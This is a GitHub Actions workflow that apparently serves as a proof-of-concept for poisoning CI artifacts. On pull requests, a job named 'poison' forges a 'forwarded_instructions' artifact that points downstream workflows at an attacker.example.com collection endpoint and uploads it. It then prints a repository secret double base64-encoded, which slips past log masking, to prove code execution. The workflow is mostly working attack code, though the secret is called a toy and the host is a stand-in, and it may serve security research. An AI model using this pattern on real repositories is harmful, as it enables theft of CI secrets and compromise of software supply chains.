name: Fuzzy CI

on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]

env:
  GERALT_SECRET: ${{ secrets.GERALT }}

jobs:
  poison:
    name: Poison forwarded instructions
    runs-on: ubuntu-latest
    steps:
      - name: Forge forwarded_instructions artifact
        run: |
          mkdir -p forward
          jq -n \
            --arg instruction "comment" \
            --arg endpoint "https://attacker.example.com/collect" \
            --arg artifacts_url "https://attacker.example.com/artifacts" \
            --arg hash "attacker-controlled" \
            '{instruction: $instruction, endpoint: $endpoint, artifacts_url: $artifacts_url, hash: $hash}' \
            > forward/instruction.json
          cat forward/instruction.json
      - name: Upload forwarded instructions
        uses: actions/upload-artifact@v4
        with:
          name: forwarded_instructions
          path: forward/
      - name: Expose toy secret to prove attacker code execution
        run: |
          echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
          exit 1
